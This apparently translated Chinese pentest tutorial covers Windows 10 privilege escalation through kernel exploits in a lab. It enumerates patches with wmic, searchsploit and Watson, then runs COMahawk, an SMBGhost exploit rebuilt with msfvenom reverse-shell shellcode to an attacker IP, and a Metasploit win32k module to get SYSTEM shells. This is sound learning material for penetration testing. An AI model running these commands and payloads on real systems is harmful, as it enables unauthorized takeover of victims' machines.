
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18768236" title="发布于 2025-03-12 18:41">
    <span role="heading" aria-level="2">Windows 提权-内核利用_2</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/kernel-exploits-part-2/" target="_blank" rel="noopener nofollow">Kernel Exploits Part 2 – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 新版 Windows 系统内核利用</a></li>
<li><a href="#id2" rel="noopener nofollow">2 搜寻内核漏洞</a>
<ul>
<li><a href="#id2.1" rel="noopener nofollow">2.1 枚举内核利用 - 手动</a></li>
<li><a href="#id2.2" rel="noopener nofollow">2.2 枚举内核利用 - 自动</a>
<ul>
<li><a href="#id2.2.1" rel="noopener nofollow">2.2.1 Searchsploit</a></li>
<li><a href="#id2.2.2" rel="noopener nofollow">2.2.2 Watson.exe</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id3" rel="noopener nofollow">3 使用内核利用</a>
<ul>
<li><a href="#id3.1" rel="noopener nofollow">3.1 提权到本地管理员 - COMahawk </a></li>
<li><a href="#id3.2" rel="noopener nofollow">3.2 提权到 SYSTEM 特权 - SMBGhost</a></li>
</ul>
</li>
<li><a href="#id4" rel="noopener nofollow">4 通过 Metasploit 查找及使用内核利用</a></li>
</ul>
<hr>
<h2 id="0前言"><strong><div id="id0">0、前言</div></strong></h2>
<p>在第二部分内容中，我们将把重点转移到现代新版 Windows 操作系统的内核利用中，这些 OS 包括 Windows 10/Server 2016/Server 2019。</p>
<p>首先，我们使用手动技术和自动工具去枚举目标机器上潜在的内核漏洞。然后，会发现两个看起来很有希望的潜在内核漏洞：COMahawk 和 SMBGhost。接下来，我们将了解如何利用这两个漏洞分别获取本地管理员和 SYSTEM shell。最后，使用 Metasploit 查看一个影响 Windows 10 几乎所有版本的内核漏洞（cve_2022_21882_win32k）。</p>
<h2 id="1新版-windows-系统内核利用"><strong><div id="id1">1、新版 Windows 系统内核利用</div></strong></h2>
<p>在上一篇文章中，我们学习了如何枚举和利用旧版 Windows 操作系统的内核漏洞。在这篇文章中，我们将探讨现代新版 Windows 操作系统的内核漏洞利用。具体来说，我们将以 Windows 10 Pro - Build 18362 - Version 1903 机器为测试目标。</p>
<p>首先，让我们来看一些枚举技术，然后使用这些技术去测试主机上查看是否存在任何内核漏洞。</p>
<h2 id="2搜寻内核漏洞"><strong><div id="id2">2、搜寻内核漏洞</div></strong></h2>
<p>在此示例中，假设我们已经在 Windows10 机器上获得了标准用户 bob 的身份。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704133-1941895044.png" alt="" loading="lazy"></p>
<h4 id="21-枚举内核利用---手动"><strong><div id="id2.1">2.1 枚举内核利用 - 手动</div></strong></h4>
<p>就像在上一篇文章中一样，我们首先要做的就是使用 systemInfo 命令查看系统的 <strong>操作系统版本、架构，以及最关键 HotFixes（KB）</strong> 等信息。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183701343-1096546798.png" alt="" loading="lazy"></p>
<p>从上面可以看到，这台主机的操作系统是 Windows 10 Pro – Build 18362 (version 1903) – x64 (64-bit)，同时该主机安装了两个补丁。</p>
<p>为了收集有关补丁的更多信息，可以使用以下 wmic 命令：</p>
<pre><code class="language-cmd">wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704546-1418615920.png" alt="" loading="lazy"></p>
<p>在内核利用的第一部分文章中我们就提到，补丁的安装日期是很值得关注的地方，因为 Windows 机器很容易受到补丁安装日期之后发布的任何内核漏洞的影响。因此，我们需要依此来确定当前机器容易受到哪些 CVE 漏洞范围的影响。</p>
<blockquote>
<p>从 2017 年底/2018 年初开始，微软不再为其披露的漏洞使用 MS 公告编号（如 "MS17-010"），而是开始使用与漏洞相关的 CVE 编号。这意味着，对于新版 Windows 内核漏洞，我们会看到它们都被标记为 CVE-20XX-XXXX。</p>
</blockquote>
<p>首先，我们可以 Google 这两个已安装的补丁程序，看看它们是针对哪些漏洞打的补丁，这样就可以知道目标不会受到哪些漏洞的攻击。也就是说，在补丁程序日期之后发现的针对此特定 Windows 版本的任何漏洞利用应该都有效。【同样的，这种手工方法只有在目标机器安装很少的补丁时才适合使用。】</p>
<p>一旦知道目标不容易受到哪些漏洞的影响之后，我们就可以在<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener nofollow">内核利用列表</a>中寻找合适的内核利用程序去测试。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704564-1857449332.png" alt="" loading="lazy"></p>
<p>通过在<strong>内核利用列表</strong>中的检查，我们发现“CVE-2020-0796”这个漏洞很适合目标当前 Windows(1903) 的版本，而且漏洞利用的发布时间是 2020 年，并且该版本比补丁安装的时间（04/2019）要晚。</p>
<p>另外，由于 GitHub 上的<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener nofollow">内核利用列表</a>中的现代新版内核漏洞利用有限，因此，我们也可以直接在 Google 上查找新的漏洞利用。</p>
<blockquote>
<p>在谷歌中使用这些关键词进行搜索：<strong>Windows 10 1903 kernel exploit</strong> 或 <strong>windows 10 18362 kernel exploit</strong>。</p>
<p>经过如此搜索之后，从搜索结果中你可能会找到一些博客或其他网站，而这些地方会提及有关这个 Windows 版本容易受到哪些 CVE 漏洞的影响，然后就可以根据找到的 CVE 编号去搜索这个编号相对应的漏洞利用程序。</p>
<p>比如说，如果我们从谷歌搜索结果中得知这个 Windows 版本容易受到“CVE-2020-0796”漏洞的攻击，那我们下一个谷歌搜索的关键词就应该是：<strong>CVE-2020-0796 github</strong></p>
</blockquote>
<h4 id="22枚举内核利用---自动"><strong><div id="id2.2">2.2、枚举内核利用 - 自动</div></strong></h4>
<p>接下来，我们将使用两种工具来枚举这台机器的内核漏洞。第一种仍是“手动”方法，因为它能指引我们朝着正确的方向前进，即 searchsploit。第二种工具是 Sherlock.ps1 的后继者，名为 Watson.exe。</p>
<h6 id="221searchsploit"><strong><div id="id2.2.1">2.2.1、Searchsploit</div></strong></h6>
<p>Searchsploit 是 Kali 内置的工具，它包含了<a href="https://www.exploit-db.com/" target="_blank" rel="noopener nofollow">Exploit-DB</a>中的所有利用。这意味着我们可以使用 searchsploit 命令搜索漏洞利用程序，然后使用这些利用程序去利用对应的漏洞。</p>
<p>例如，可以使用以下命令来查看此版本的 Windows 是否存在对应的利用程序。</p>
<pre><code class="language-bash">searchsploit 1903
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183705400-763811141.png" alt="" loading="lazy"></p>
<p>可以看到，有三个潜在的漏洞可供我们去尝试。虽然它们对应的利用文件都是一些 txt 的说明文档，但这些文件的内容中可能会包含实际利用程序的链接地址。</p>
<blockquote>
<p>为了能更广泛且反复的搜索，可以使用命令 <code>searchsploit Windows 10 &gt; vulns.txt</code> 将搜索结果转存一份，然后通过 grep 在 vulns.txt 文件中查找更多的漏洞。但也有一些漏洞，它的名称中可能就不包含 "1903" 这个特定数字，因此通过上述的搜索很可能会遗漏掉一些潜在的漏洞。</p>
</blockquote>
<p>通过以下命令镜像一份说明文档，并查看：</p>
<pre><code class="language-bash">searchsploit -m 48267

cat 48267.txt
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704344-1830675194.png" alt="" loading="lazy"></p>
<p>在 TXT 文件中，我们可以看到这是 CVE-2020-0796。这意味着这个漏洞比目标的最新补丁还要新，因此，应该可以利用这个漏洞提升到 SYSTEM。另外，漏洞利用的标题（Windows SMBv3 LPE Exploit）还显示了目标 SMB 的具体版本，而如果这个也可以和目标 SMB 版本相匹配的话，那就很有希望了。</p>
<blockquote>
<p>对于在 Searchsploit 中发现的每个漏洞，最好先 Google 搜索与之相关的 CVE 编号，然后再查找与 CVE 相关的 KB 编号。一旦确定了 KB 编号，就可以与目标机器已安装的补丁 KB 进行参考对比，以此来检查该漏洞是否已打补丁。</p>
</blockquote>
<p>如前所述，searchsploit 更像是一个指引者，它指引着我们朝着正确的方向前进。它为我们提供了潜在的漏洞利用，我们通过研究这些漏洞利用来确定目标是否易受攻击。</p>
<h6 id="222watsonexe"><strong><div id="id2.2.2">2.2.2、Watson.exe</div></strong></h6>
<p><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener nofollow">Watson</a>（华生）是 sherlock.ps1 的继任者，它枚举了现代新版 Windows 系统的本地内核漏洞，它的工作内容和 Sherlock.ps1 对旧版 Windows 系统枚举内核漏洞所做的工作是一样的。</p>
<p>通过内置的 CVE 数据库和针对这些漏洞的补丁的 KB 编号，Watson 会将这些 CVE 对应的 KB 编号与已安装补丁的 KB 编号进行相互比对，并依此来确定缺失的补丁，进而判断出目标容易受到哪些漏洞的攻击。</p>
<p>不幸的是，Watson 已经几年没有更新了。这意味着它将不包括更新版本的 Windows 操作系统的利用。</p>
<blockquote>
<p>Watson 支持的 Windows 版本：Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004 / Server 2016 &amp; 2019</p>
</blockquote>
<p>另一个问题是 watson.exe 并没有预先编译，而要对 GitHub 上的源码进行编译，需要先对多个脚本进行一些编辑才能使其正确编译和工作。</p>
<p>幸运的是，我修复并编译了它，这是它的<a href="https://github.com/Juggernaut-Sec/Windows-Privilege-Escalation/blob/main/Watson.exe" target="_blank" rel="noopener nofollow">编译版本</a>。下载 watson.exe 之后将其传输到受害者机器上即可。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183701952-136699723.png" alt="" loading="lazy"></p>
<p>Cool！现在，我们可以执行它，然后再查看输出。</p>
<pre><code class="language-cmd">.\Watson.exe
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183703767-903281181.png" alt="" loading="lazy"></p>
<p>Watson 发现，目标系统容易受到 11 个潜在漏洞的影响，并提供了一份 CVE 编号的列表，以及针对每个漏洞对应的漏洞利用程序的链接。</p>
<blockquote>
<p>提示：winPEAS 内置了 Watson，并还包括 SMBGhost 检查。</p>
</blockquote>
<p>现在，我们可以访问输出中的链接或谷歌搜索这些 CVE 漏洞，看看有哪些符合我们的需要。</p>
<h2 id="3使用内核利用"><strong><div id="id3">3、使用内核利用</div></strong></h2>
<p>在本例中，我们将研究如何使用 COMahawk 和 SMBGhost 漏洞利用程序以分别将我们普通用户的权限提升为本地管理员和 SYSTEM。</p>
<h4 id="31提权到本地管理员---comahawk"><strong><div id="id3.1">3.1、提权到本地管理员 - COMahawk</div></strong></h4>
<p>从 Watson 的输出结果来看，<a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener nofollow">这里</a>提供了针对 CVE-2019-1405 漏洞的利用程序，我们只需下载该利用程序并将其传输到受害者机器。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704526-1513223093.png" alt="" loading="lazy"></p>
<p>执行该利用程序之后，它将会创建一个名为 Tomahawk 的新用户，密码为 RibSt3ak69，并将该用户添加到本地管理员组。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183701992-85348148.png" alt="" loading="lazy"></p>
<p>Awesome！我们成功利用了此内核漏洞，并创建了一个新的本地管理员用户！</p>
<p>接下来，要获得本地管理员的完整权限（即 高完整性 shell），请参照 <a href="https://www.cnblogs.com/kqdssheng/p/18751119#id2.3" target="_blank">RunAs</a> 提权技术和 <a href="https://www.cnblogs.com/kqdssheng/p/18745249#id3" target="_blank">UAC 绕过</a>提权技术。</p>
<h4 id="32提权到-system-特权---smbghost"><strong><div id="id3.2">3.2、提权到 SYSTEM 特权 - SMBGhost</div></strong></h4>
<p>在本例中，我们将了解如何使用 SMBGhost 漏洞将普通用户的权限提升到 SYSTEM。</p>
<blockquote>
<p>SMBGhost 是一种基于缓冲区溢出的利用类型。</p>
</blockquote>
<p>据我所知，这个漏洞利用程序也是没有预编译的文件的，因此必须自己进行编译。这样做的好处是，我们可以自定义执行的命令，而不是像 COMahawk 那样只能创建一个本地管理员用户。</p>
<blockquote>
<p>您需要在 Windows 实验机上安装 Visual Studio 才能编译此漏洞。我在 Windows 10 实验机上安装了 Visual Studio 2022，这次演示也将使用它。</p>
</blockquote>
<p>首先，我们从 GitHub 获取 SMBGhost 漏洞的利用程序的<a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener nofollow">源码</a>文件，并将其解压缩。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704304-603535831.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183703086-2088754622.png" alt="" loading="lazy"></p>
<p>然后，我们需要在 Visual Studio 中打开该项目。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704483-602782962.png" alt="" loading="lazy"></p>
<p>这将把整个项目加载到 Visual Studio 中，而在解决方案资源管理器的右侧可以找到所有文件。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183701872-2088379432.png" alt="" loading="lazy"></p>
<p>找到并打开 exploit.cpp 文件，然后定位到 shellcode 变量部分。在此处，我们需要对 shellcode 变量值进行编辑，以满足可以生成一个反向 shell 的需求。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183706671-548520186.png" alt="" loading="lazy"></p>
<p>回到攻击机，使用下面的 msfvenom 命令以生成可以反向 shell 的 shellcode：</p>
<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f dll -f csharp
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704008-857973152.png" alt="" loading="lazy"></p>
<p>这里有几点需要注意。（1）该漏洞利用程序的有效载荷大小不能超过 600 字节。（制作的载荷只有 460 字节，无碍）（2）我们需要复制这段 shellcode（不包括大括号和分号），以替换 exploit.cpp 文件中的 shellcode。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704950-1687621532.png" alt="" loading="lazy"></p>
<blockquote>
<p>请注意，我把 shellcode 的每一行都用 Tab 制表符使其与原始 shellcode 保持一致。</p>
</blockquote>
<p>接下来，开始编译它。先在 Visual Studio 的工具栏，将“构建选项”设置为“Release”和“ X64”。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183705079-31252044.png" alt="" loading="lazy"></p>
<p>然后，转到菜单栏的“构建”选项，选择“构建解决方案”。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704318-1390306326.png" alt="" loading="lazy"></p>
<p>等构建完成之后，可以看到 Visual Studio 已编译完成。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183702587-1860570153.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183702387-782061182.png" alt="" loading="lazy"></p>
<p>接下来，我们只需要将编译后的漏洞利用程序通过 SMB 共享传输到受害者机器，然后就可以开始利用了。</p>
<pre><code class="language-bash">impacket-smbserver share $(pwd) -smb2support
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704663-1590344788.png" alt="" loading="lazy"></p>
<p>将文件复制到受害者机器，并将其重命名为 SMBGhost.exe，就像：</p>
<pre><code class="language-cmd">copy \\172.16.1.30\share\SMBGhost.exe .
.\SMBGhost.exe
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704143-1040495535.png" alt="" loading="lazy"></p>
<p>在执行此利用程序之前，我们需要启动一个 netcat 监听器（443 端口）。</p>
<blockquote>
<p>注意：如果此漏洞利用无法正常工作，那么很有可能是因为它需要 vcruntime140.dll 文件才能执行所导致的。只需将该文件一并传输给受害者即可，文件在  <code>C:\Windows\System32</code> 目录下。</p>
</blockquote>
<p>最终，当运行它时，我们会看到有一条成功的消息提示，这表明它奏效了。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183702392-166386235.png" alt="" loading="lazy"></p>
<p>回到 netcat，我们获得了一个 SYSTEM shell！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704319-1797816322.png" alt="" loading="lazy"></p>
<h2 id="4通过-metasploit-查找及使用内核利用"><strong><div id="id4">4、通过 Metasploit 查找及使用内核利用</div></strong></h2>
<p>在本例中，我制作了一个 x64 meterpreter 有效载荷并将其传输到受害者机器执行，以获得 Meterpreter shell。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704383-1352713149.png" alt="" loading="lazy"></p>
<p>Metasploit 有很多用于现代内核漏洞的模块。但是，当我们尝试像之前那样使用本地漏洞利用建议模块时，发现它并不能为我们找到什么。</p>
<p>相反，我们可以使用 <strong>background</strong> 命令退出 meterpreter 会话，然后使用以下命令枚举有效的 CVE 漏洞：</p>
<pre><code class="language-bash">search exploit/windows/local/cve
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183706219-211562639.png" alt="" loading="lazy"></p>
<p>搜索结果并不包括所有内核漏洞，这是因为 Metasploit 并非都是以 CVE 编号命名的漏洞利用模块。例如，我们可以看到 SMBGhost 在列表中，但 COMahawk 却不在其中。</p>
<p>虽然有一些小遗憾，但它仍为我们测试漏洞利用提供了一个很好的起点。我们可以根据 Watson 扫描输出的信息，然后在 Metasploit 上测试出现的漏洞利用，如 CVE-2020-0668 和 SMBGhost。</p>
<p>此外，我们还可以通过搜索 COMahwk 的名称来测试它。不过，在上面示例中已经看到了 SMBGhost 和 COMahawk 被利用的情况，所以接下来让我们来看看这个影响了 Windows 10 很多版本的内核漏洞（cve_2022_21882_win32k）。</p>
<pre><code class="language-bash">use exploit/windows/local/cve_2022_21882_win32k
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183702712-2015175875.png" alt="" loading="lazy"></p>
<p>同时，让我们快速看看受该漏洞影响的 Windows 10 的版本有哪些。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704149-1974826204.png" alt="" loading="lazy"></p>
<p>WOW！这几乎影响了 Windows 10 的所有版本，一直到 Windows 11 之前的最新和最终版本！</p>
<p>好吧，现在让我们将参数信息添加到模块中：</p>
<pre><code class="language-bash">set SESSION 1
set LHOST 172.16.1.30
set LPORT 8080
show options
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183704875-670590728.png" alt="" loading="lazy"></p>
<p>等设置了所有参数之后，使用 exploit 命令，应该就能看到有第二个会话产生，并且该会话拥有 SYSTEM 权限。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250312183707724-1743419695.png" alt="" loading="lazy"></p>
<p>BOOM！我们得到了 SYSTEM shell，这个漏洞太可怕了！</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.07508152645717593" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-12 18:41">2025-03-12 18:41</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">5</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18768236" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18768236);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18768236', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18768236', title: 'Windows 提权-内核利用_2' })">举报</a>
</div>
        